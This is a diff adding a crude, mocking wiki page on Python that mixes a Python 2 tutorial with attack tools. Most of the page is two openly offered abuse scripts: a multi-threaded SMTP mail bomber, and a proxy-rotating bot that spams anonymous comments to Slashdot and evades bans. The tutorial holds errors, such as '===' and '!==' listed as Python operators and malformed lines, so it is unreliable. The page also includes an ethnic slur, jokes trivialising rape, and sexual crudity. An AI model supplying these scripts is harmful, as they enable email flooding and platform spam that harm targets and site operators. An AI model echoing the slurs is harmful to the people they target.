@@ -1,0 +1,675 @@
+Python
+{{potential}}
+
+{{haxor}}
+[[Image:German-python-book.jpg|right|thumb|Oh those crazy [[German]]s!  Well, at least they got the right phylum.]]
+
+'''Python''' is a chafing and slow [[programming language|scripting language]], used only by [[mathematician]]s not in-the-know, and [[skript kiddies]] for writing [[blog]]-[[crapflood|chaf]]ing scripts. Also good fo [[SSH]]SSSSSSSS HSSSSSSSSSSSSSSSS HSSSSSSSSSSSS HSSSS HSSSSSSSSSSSS HSS HSS HSSSSS HSSS HSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS.
+
+Python is the invoker of a fuckload of [[butthurt]]. Nobody in the whole fucking [[4chan|world]] uses Python anymore except [[lolcats]] and the occasional [[Ron Paul]]. Python has been known for it's complicated  coding and [[Insane|batshit crazy]] errors that, when translated from [[moonspeak]] to [[English]] says something about how you can't program because of a "firewall" problem or a "network ear fuck." Those problems usually encourage you to just [[Rape|not fight it and play along]] because upon further investigation, you'll be [[Friend_Zone|mind-fucked]] with frustration the same way you get eye-fucked watching [[Lemonparty|old guys having an orgy]]. 
+
+Python is an object oriented, interpreted language. It is unique in that it requires a user to indent in place of using curly brackets ({). It is used (along with PHP and VB) for many tools, since it is easy to use and has many features. 
+
+Note: that most *nix distrobutions come with Python by default. Did you click this page cause you were expecting [[Spanish Inquisition |something completely different?]]
+
+==Tutorial==
+
+Below applies to Python 2.6 or lower, Python 3 is a good bit different.
+
+===Basics===
+''Basic'' python syntax
+
+====Hello World!====
+ >>> print "HELLO WORLD!"
+ HELLO WORLD!
+
+====Variables====
+Variable names DO NOT need to begin with a special character, unlike PHP. Variable names CAN, however, be any combination, as long as the word isn't reserved (Ex: and, or, print), of letters and numbers.
+
+
+ >>> #Numbers
+ >>> a = 1 #Declare A as 1
+ >>> b = a+5 #b becomes 6, while a remains 1
+ >>> a += 5 #a is overwritten, and becomes 6
+ >>> c = b = a #c and b are overwritten and become 6
+ >>> #Strings
+ >>> a = "Hello "
+ >>> b = "There"
+ >>> c = a+b #JOIN STRINGS
+ >>> a = "Blue Yellow Green Red".split(" ") #Split the string at every " "
+ >>> a #Output 'a' to the screen, same as print or print()
+ ['Blue', 'Yellow', 'Green', 'Red'] #List object, another type of variable
+ >>> ''.join(a) #Join all the list objects as one
+ 'BlueYellowGreenRed'
+ >>> a = 'Blue Green Yellow Red'[0:4] #This returns the sub-string 'Blue'
+ >>> a = 'Blue Green Yellow Red'[5:] #This returns the sub-string 'Green Yellow Red'
+ >>> a = 'a = 'Blue Green Yellow Red'[::2] #This returns the sub-string ''Bu re elwRd'
+ >>> #Float 
+ >>> a = 88.2
+ >>> b = 88
+ >>> print (a/25)
+ 3.528
+ >>> (print b/25)
+ 3
+ >>> #Other types
+ >>> a = (" ", 355, 256.7, ["Hello", "World"])
+ >>> type(a)
+ <type 'tuple'>
+ >>> a = {"Hello":"World", "Key":"Value"}
+ >>> type(a)
+ <type 'dict'>
+ >>> a = "Anhero"
+ >>> del a #Its a good idea, if you're making a 'hidden' script, to delete variables after you use them...
+
+===Statements===
+
+====Comparison====
+ < Less than
+ > Greater than
+ == Equal to
+ != Not equal
+ === Identical
+ !== Not identical
+ <= Less than or equal to
+ >= Greater than or equal to
+
+=====If=====
+ 
+ >>> a = 1
+ >>> b = 2
+ >>> if a != b:
+ 	print ("No!")
+  
+  	
+ No!
+ >>> a = 1
+ >>> b = 1
+ >>> if a == b:
+ 	print ("Yes!")
+ 
+ 	
+ Yes!
+ >>> a = 1
+ >>> b = 5
+ >>> if (a == b-len("....")/1) and "a" == "a" or "b" == "b":
+ 	print ("Yes!")
+ 
+  	
+ Yes!
+
+====Loops====
+ 
+=====While=====
+ >>> a = 1
+ >>> while a < 5: #Note, replacing '<' with '<=' allows it to reach 5, instead of stopping at 4
+ 	print (a)
+ 	a += 1
+
+	
+ 1
+ 2
+ 3
+ 4
+ >>> a = False
+ >>> while a == False:
+ 	print ("False")
+ 	a = True
+ 
+ 	
+ False
+=====For=====
+ >>> for x in range(0, 10):
+ 	print (x)
+ 
+ 	
+ 0
+ 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+ >>> for x in ['Hello', 'world', 'this', 'is', 'a', 'list']:
+ 	print (x)
+ 
+ 	
+ Hello
+ world
+ this
+ is
+ a
+ list
+
+===Classes===
+Since python is object oriented, you can define classes:
+The Keyword for defining classes is "class," and if you want to derive your class from another one, put it into brackets after the class name. The definition is closed by the notorious colon, followed by the notorious indented block.
+Notable about Python is, that every datatype is a class, even the simple ones.
+
+====Self reference, Member access====
+The self reference of a python class is, plain and simple "self." Class members can be accessed with the class/object name followed by a dot and the member name:
+ Myclass.myMember
+
+====Methods====
+Methods are defined like functions, just with the difference that their first parameter is "self"
+
+=====Constructor/Destructor=====
+'''''Constructors''''' in python classes are made by defining a method with the name '__init__' (Two underscores at the beginning and two underscores at the end)
+'''''Destructors''''' are alike, just '__del__' instead of '__init__'. Since Python has automatic memory management and a garbage collector, it cannot be assured that the destructor is called instantly at the classes' end of life. So don't rely on code you put in a destructor too heavily, or even better try to avoid using one.
+
+
+ class TheGame():
+     def __init__(self):
+         self.toPrint = 'You just lost it!'
+         print (self.toPrint)
+     def printLulz(self):
+         print ("LULZ")
+     def __del__(self):
+         print ('If this method gets called, you won THE GAME!')
+
+====Objects====
+Creating an object of a Python class works as in most object oriented languages:
+ myObject = TheGame()
+
+myObject is now an instance of TheGame() so myObject can be used to call any of TheGame()'s functions. Example: 
+
+ myObject.printLulz()
+
+The above will print "LULZ" into the interpreter. 
+
+====Inheritance====
+Inheritance is just what it sounds like. It's when a class inherits all the methods of a "father" class. 
+
+ class Inherit(TheGame):
+     def __init__(self):
+         pass
+ Inherit().printLulz()
+
+The above code will print out "LULZ" into the interpreter because it inherits the method printLulz() from the class TheGame().
+
+===Examples===
+
+====Multi-Threaded Mail Bomber====
+
+ #CREATED BY: DUMP 
+ #MULTI THREADING ALLOWS FOR A CLASS TO BE RUN MULTIPLE TIMES AT ONCE.
+ #INCLUDES SMTP ENGINE, AND MAIL HEADER GEN. THAT FOLLOWS RFC STARDARDS
+ import socket, datetime, time, threading
+ class MailGen():
+     def Engine(self, To, From, Subject, Data):
+         self.lf = "\r\n"
+         return "From: \""+From.split("@")[0]+"\" <"+From+">"+self.lf+"Return-Path: "+From+self.lf+"Sender: "+From+self.lf+"Recieved: "+From.split("@") [1].capitalize()+":25"+self.lf+"To: \""+To.split("@")[0]+"\" <"+To+">"+self.lf+"Subject: "+Subject+self.lf+"Date:  "+datetime.datetime.now().strftime("%a, %d %d %Y %H:%S")+self.lf+self.lf+Data
+ class MailBomb(threading.Thread):
+     def __init__(self, To, From, Data):
+         self.To = To
+         self.From = From
+         self.Data = Data
+         threading.Thread.__init__ ( self )
+     def run(self):
+         print ("THREAD LAUNCHED")
+         self.lf = "\r\n"
+         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+         self.connection.connect((self.To[self.To.index("@")+1:len(self.To)], 25))
+         self.connection.send("HELO"+self.lf); self.connection.recv(1024)
+         self.connection.send("MAIL FROM: "+self.From+self.lf); self.connection.recv(1024)
+         self.connection.send("RCPT TO: "+self.To+self.lf); self.connection.recv(1024)
+         self.connection.send("DATA"+self.lf); self.connection.recv(1024)
+         for line in self.Data: self.connection.send(line)
+         self.connection.send(self.lf+self.lf+"."+self.lf); self.connection.recv(1024)
+         self.connection.send("QUIT"+self.lf); self.connection.close()
+ address1 = raw_input("To E-mail: ")
+ address2 = raw_input("From E-mail: ")
+ data1 = raw_input("Subject: ")
+ data2 = raw_input("Data: ")
+ generator = MailGen()
+ message = generator.Engine(address1, address2, data1, data2)
+ multiply = int(raw_input("Amount Sent (0, 5, 10...): "))
+ lists = [address1]*multiply
+ for a in range(0, multiply, 5):
+     for b in range(a, a+5):
+         MailBomb(lists[b], address2, message).start()
+     time.sleep(.50)
+
+===Modules===
+
+====Scapy====
+Scapy is a powerful, low-level, networking tool
+
+====DPKT====
+fast, simple packet creation / parsing, with definitions for the basic TCP/IP protocols. 
+
+==Fun With Python==
+
+Below: A Python script that chafes the ever-living shit out of [[Slashdot]].
+
+<pre>
+import getopt
+from os import getpid
+from random import choice, randrange
+import re
+from string import letters
+from sys import argv, exit
+import threading
+from time import sleep
+import urllib
+
+numthrds = 5
+
+##############################################################################
+#   FUNCTION DEFINITIONS                                                     #
+##############################################################################
+
+def errmsg(msg):
+	from sys import stderr
+	print >> stderr, str(getpid()) + ': ' + msg
+
+def getformkey(str):
+	r = re.search('<INPUT.*NAME="formkey" VALUE="[0-9a-zA-Z]+"', str)
+	if r:
+		return re.search('[0-9a-zA-Z]{10}', r.group(0)).group(0)
+	else:
+		return ''
+
+def rndchars(x):
+	str = ""
+	for i in range(randrange(x, x + 2)):
+		str += choice(letters).lower()
+	return str
+
+def rndsubject():
+	s = ''
+	for i in range(4):
+		s += rndchars(6)
+	return s
+
+###################
+# Do getopt stuff #
+###################
+msgfile = 'msg.txt'
+opt_d = 0
+opt_l = 0
+proxfile = 'proxies.txt'
+purl = 'http://slashdot.org/comments.pl'
+sid = '20721'
+
+try:
+	opts, args = getopt.getopt(argv[1:], 'df:hlp:s:u:')
+except getopt.GetoptError, msg:
+	from sys import stderr
+	print >> stderr, argv[0] + ': ' + str(msg)
+	exit(3)
+
+for c, optarg in opts:
+	if c == '-d':
+		opt_d = 1
+	if c == '-f':
+		msgfile = optarg
+	if c == '-h':
+		print 'pystorm: ' + argv[0] + ' [OPTION]...'
+		print 'Perform automated comment posting on a Slashcode blog.\n'
+		print '  -d         remove nonworking proxies from internal list'
+		print '  -f [FILE]  read HTML messages from [FILE]'
+		print '  -h         display this usage help'
+		print '  -l         just display list of HTTP proxies collected and exit'
+		print '  -p [FILE]  read list of HTTP proxies from [FILE], one per line'
+		print '  -s [NUM]   post to the story with ID [NUM]'
+		print '  -u [URL]   use [URL] as the comment posting script'
+	if c == '-l':
+		opt_l = 1
+	if c == '-p':
+		proxfile = optarg
+	if c == '-s':
+		sid = optarg
+	if c == '-u':
+		purl = optarg
+
+if proxfile == '':
+	errmsg('no proxy file given')
+	exit(10)
+
+##############################
+# Read proxies into an array #
+##############################
+
+proxies = []
+num_proxies = 0
+
+try:
+	f = open(proxfile, 'r')
+except:
+	errmsg("an error occurred when trying to open " + proxfile)
+	exit(5)
+
+for x in f.readlines():
+	proxies.append('http://' + x.strip())
+	num_proxies += 1
+
+f.close()
+if num_proxies == 1:
+	errmsg('read in 1 proxy')
+elif num_proxies > 0:
+	errmsg('read in ' + str(num_proxies) + ' proxies')
+else:
+	errmsg('couldn\'t read in proxies from ' + proxfile)
+	exit(7)
+
+if opt_l > 0:
+	for n in proxies:
+		print n
+	exit(0)
+
+if purl == '':
+	errmsg('no post URL given')
+	exit(11)
+
+if sid == '0':
+	errmsg('no SID given')
+	exit(9)
+
+if msgfile == '':
+	errmsg('no message file given')
+	exit(4)
+
+########################################
+# Read messages/subjects into an array #
+########################################
+
+msgs = []
+subjects = []
+num_msgs = 0
+
+try:
+	f = open(msgfile, 'r')
+except:
+	errmsg('an error occurred when trying to open ' + msgfile)
+	exit(2)
+
+i = 0
+
+msgs.append('')
+for x in f.readlines():
+	if x == "%\n":
+		i = 0
+		msgs.append('')
+		num_msgs += 1
+	else:
+		if i == 0:
+			msgs[num_msgs] = ''
+			subjects.append(x)
+			i = 1
+		else:
+			msgs[num_msgs] += x
+num_msgs += 1
+
+f.close()
+if num_msgs == 1:
+	errmsg('read in 1 message')
+elif num_msgs > 0:
+	errmsg('read in ' + str(num_msgs) + ' messages')
+else:
+	errmsg('couldn\'t read in messages from ' + msgfile)
+	exit(6)
+
+class SpamThread(threading.Thread):
+
+	def run(self):
+
+		global opt_d
+
+		while 1:
+
+			self.proxy = choice(proxies)
+			self.opendev = urllib.FancyURLopener({'http': self.proxy})
+			self.url = purl + '?sid=' + sid + '&op=Reply'
+
+			# choose a message
+			self.i = randrange(0, num_msgs)
+			try:
+				self.subject = subjects[self.i].strip()
+			except:
+				self.subject = rndsubject()
+			self.msg = msgs[self.i] + '\n' + rndchars(2)
+
+			# get rid of that "Re:" shit in the subject
+			if self.subject[0:3] == 'Re:':
+				self.subject = self.subject[3:]
+
+			# get initial post form
+			try:
+				#f = self.opendev.open(self.url, urllib.urlencode({}))
+				f = self.opendev.open(self.url)
+			except IOError:
+				print self.proxy, "couldn't open post form"
+				continue
+			try:
+				str = f.read(50000)
+			except:
+				print self.proxy, "got no data"
+				if opt_d != 0:
+					try:
+						proxies.remove(self.proxy)
+					except ValueError:
+						pass
+				continue
+
+			if '<TITLE>BANNED!</TITLE>' in str:
+				print self.proxy, "is banned"
+				if opt_d != 0:
+					try:
+						proxies.remove(self.proxy)
+					except ValueError:
+						pass
+				continue
+
+			# get formkey
+			formkey = getformkey(str)
+			if formkey != '':
+				print self.proxy, "got 1st formkey " + formkey
+			else:
+				if '<FONT COLOR="#000000">i have a big cock' in str:
+					errmsg('This story has been archived')
+					exit(8)
+				print "Proxy", self.proxy, "couldn't get 1st formkey"
+				if opt_d != 0:
+					try:
+						proxies.remove(self.proxy)
+					except ValueError:
+						pass
+				continue
+
+			# setup POST request
+			self.par = urllib.urlencode(
+			{
+			'sid': sid,
+			'pid': '0',
+			'formkey': formkey,
+			'postersubj': self.subject,
+			'postercomment': self.msg,
+			'postanon_present': '1',
+			'postanon': 'on',
+			'op': 'Preview',
+			'posttype': '2'
+			})
+
+			# preview comment
+			try:
+				f = self.opendev.open(self.url, self.par)
+			except IOError:
+				print self.proxy, "couldn't preview"
+				if opt_d != 0:
+					try:
+						proxies.remove(self.proxy)
+					except ValueError:
+						pass
+				continue
+			try:
+				str = f.read(50000)
+			except:
+				print self.proxy, "got no data"
+				if opt_d != 0:
+					try:
+						proxies.remove(self.proxy)
+					except ValueError:
+						pass
+				continue
+
+
+			# is this proxy readonly?
+			if '<!-- Error type: readonly -->' in str:
+				print self.proxy, "is readonly"
+				if opt_d != 0:
+					try:
+						proxies.remove(self.proxy)
+					except ValueError:
+						pass
+				continue
+
+			# get new formkey
+			formkey = getformkey(str)
+			if formkey != '':
+				print self.proxy, "got 2nd formkey " + formkey
+			else:
+				print self.proxy, "couldn't get 2nd formkey"
+				if opt_d != 0:
+					try:
+						proxies.remove(self.proxy)
+					except ValueError:
+						pass
+				continue
+
+			# fucking 20 second shit
+			print 'Waiting 20 seconds'
+			sleep(20)
+
+			self.url = purl + '?sid=' + sid + '&op=Submit'
+
+			# setup POST request
+			self.par = urllib.urlencode(
+			{
+			'sid': sid,
+			'pid': '0',
+			'rlogin': '1',
+			'formkey': formkey,
+			'unickname': '',
+			'upasswd': '',
+			'postersubj': self.subject,
+			'postercomment': self.msg,
+			'op': 'Submit',
+			'posttype': '2'
+			})
+
+			# submit comment
+			f = self.opendev.open(self.url, self.par)
+			try:
+				str = f.read(50000)
+			except:
+				print self.proxy, "got no data"
+				if opt_d != 0:
+					try:
+						proxies.remove(self.proxy)
+					except ValueError:
+						pass
+				continue
+
+			# did it work?
+			if '</TABLE>Comment Submitted.' in str:
+				print self.proxy, "posted #", self.i, "successfully"
+			elif '<!-- Error type: filter message -->' in str:
+				print self.proxy, "content too lame to post"
+				exit(12)
+			else:
+				if 'Slashdot requires you to wait' in str:
+					print self.proxy, "hit 2 minute limit"
+					continue
+				elif '<!-- Error type: troll message -->' in str:
+					print self.proxy, "has been 'temporarily' banned"
+					if opt_d != 0:
+						try:
+							proxies.remove(self.proxy)
+						except ValueError:
+							pass
+						continue
+				print self.proxy, "screwed up submit"
+
+#####################
+# Main program loop #
+#####################
+
+if __name__ == '__main__':
+
+	threadList = []
+
+	# spawn threads
+	for i in range(numthrds):
+		thread = SpamThread()
+		threadList.append(thread)
+
+	# start the fuckers
+	for thread in threadList:
+		thread.start()
+
+	# did all the threads start?
+	numthreads = threading.activeCount() - 1
+	errmsg('made ' + str(numthrds) + ' threads, ' + str(numthreads) + ' started')
+
+	# keep track of how many proxies
+	x = len(proxies)
+	while threading.activeCount() > 1:
+		y = len(proxies)
+		if x != y:
+			if y == 1:
+				errmsg("1 proxy in global list")
+			elif y == 0:
+				errmsg("all proxies used up")
+				exit(0)
+			else:   
+				errmsg(str(y) + " proxies in global list")
+		try:
+			sleep(0.6)
+			x = y
+		except:
+			exit(1)
+</pre>
+<pre>
+      ___               
+    ,'._,`.              PYTHON SUCKS                                                 
+   (-.___.-)               EVEN SANDNIGGERS CAN MASTER IT
+   (-.___.-)                 DESPITE THE FACT THAT THIS IS OBVIOUSLY A COBRA                           
+   `-.___.-'                                            
+    ((  @ @|              .            __                                 
+     \   ` |         ,\   |`.    @|   |  |      _.-._                     
+    __`.`=-=mm===mm:: |   | |`.   |   |  |    ,'=` '=`.                   
+   (    `-'|:/  /:/  `/  @| | |   |, @| @|   /---)W(---\                  
+    \ \   / /  / /         @| |   '         (----| |----) ,~              
+    |\ \ / /| / /            @|              \---| |---/  |               
+    | \ V /||/ /                              `.-| |-,'   |               
+    |  `-' |V /                                 \| |/    @'               
+    |    , |-'                                 __| |__                    
+    |    .;: _,-.                         ,--""..| |..""--.               
+    ;;:::' "    )                        (`--::__|_|__::--')              
+  ,-"      _,  /                          \`--...___...--'/               
+ (    -:--'/  /                           /`--...___...--'\               
+  "-._  `"'._/                           /`---...___...---'\              
+      "-._   "---.                      (`---....___....---')             
+       .' ",._ ,' )                     |`---....___....---'|             
+       /`._|  `|  |                     (`---....___....---')             
+      (   \    |  /                      \`---...___...---'/              
+       `.  `,  ^""                        `:--...___...--;'               
+         `.,'                               `-._______.-'                 
+</pre>
+
+==Unladen Swallow==
+Apparently some tenacious employees at Google (who use Python for fucking EVERYTHING) have taken it upon themselves to try to optimize Pythons completely fucked structure. All that can be said is Allah help those poor unfortunate bastards. Read about their failure-iffic exploits [http://code.google.com/p/unladen-swallow/wiki/ProjectPlan here.]  [[Steven_F_Lott|Other people]] claim to be awesome Python programmers but obviously aren't.
+
+==External Links==
+* [http://www.python.com Python.com] - Go here to get your own copy of Python
+* [http://img2.info img2.info] - An imageboard script written in Python
+
+=== Disambiguation ===
+
+Do not confuse this with [[Monty Python]] or the [[Penis|snake]] of the same name. Although, might be worth noting that Python was named after "Monty Pythons Flying Circus", [http://www.python.org/doc/faq/general/#why-is-it-called-python No shit.] Not to mention the [[virgin|source code comments are filled with MP references and quotes.]]
+
+{{Softwarez}}
+[[Category: Softwarez]]
